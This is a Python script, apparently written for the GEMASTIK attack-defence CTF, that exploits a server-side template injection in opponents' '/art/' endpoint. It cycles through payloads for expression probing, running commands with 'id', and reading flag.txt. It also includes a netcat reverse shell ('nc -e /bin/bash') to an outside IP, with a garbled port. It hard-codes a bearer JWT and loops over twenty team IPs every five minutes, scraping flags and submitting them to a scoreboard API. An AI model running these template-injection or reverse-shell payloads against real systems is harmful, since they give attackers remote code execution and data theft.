import requests
import urllib
payload = "#{7*7}"
payload = "#{system('nc -e /bin/bash 10.49.0.32 133710.49.0.32')}"
payload = "#{system('id')}"
payload = '#{ %x|cd ..;cd ..;cat flag.txt| }'
payload = urllib.parse.quote(payload)

from time import sleep
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6ImUzY2Q4NjRjLTczZTItNGE4Mi1hMjhmLTA4ZDQ1NDhjN2U5NyIsIlVzZXJuYW1lIjoiYWV6YWttaV9QT0xJQkFUQU0iLCJJc0FkbWluIjpmYWxzZSwiZXhwIjoxNjk0NjI5MDIxfQ.plqPIP9FpZ-QQEjj59JOt_XIhFvws-9jtJcsEZJPxjw"

IP = "10.100.101.103:10000"
URL = "http://"+IP+"/art/"+payload
HEADERS = {
        "Authorization" : "Bearer {}".format(TOKEN),
        'Content-Type': 'application/json',
        }


def exploit(list_flag):
    url = "https://ctf-gemastik.ub.ac.id/api/flag"
    data = {"flags": list_flag}
    print('run oke...')
    print(data)
    print(requests.post(url=url, json=data, headers=HEADERS).status_code)


    



def list_ip():
    result = []
    ip_format = "10.100.101."
    for i in range(1,21):
        if i == 9:
            continue
        result.append(ip_format + str(100+i))
    return result

LIST_IP = list_ip()
if __name__ == "__main__":
    #print(exploit(URL))
    while True:
        RES = []
        for i in LIST_IP:
            try:
                test = requests.get("http://"+i+":10000"+"/art/"+payload).text.split('=')[5].replace('></iframe>',"")
                if "GEMASTIK" in test:
                    print(f"\"{test}\"", end=",")
                    RES.append(f"{test}")
            except:
                pass
        exploit(RES)
        sleep(300)
